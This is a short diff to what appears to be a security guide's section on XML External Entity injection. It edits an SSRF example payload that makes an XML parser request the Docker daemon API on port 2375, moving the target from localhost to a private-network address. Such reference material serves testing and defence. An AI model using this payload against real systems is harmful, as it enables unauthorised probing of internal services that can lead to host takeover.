@@ -71,7 +71,7 @@ XML External Entity injection is a parser-level failure that enables local file 
 ### SSRF
 
 ```xml
-<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://192.168.1.14:2375/version">]>
 <r>&xxe;</r>
 ```
 
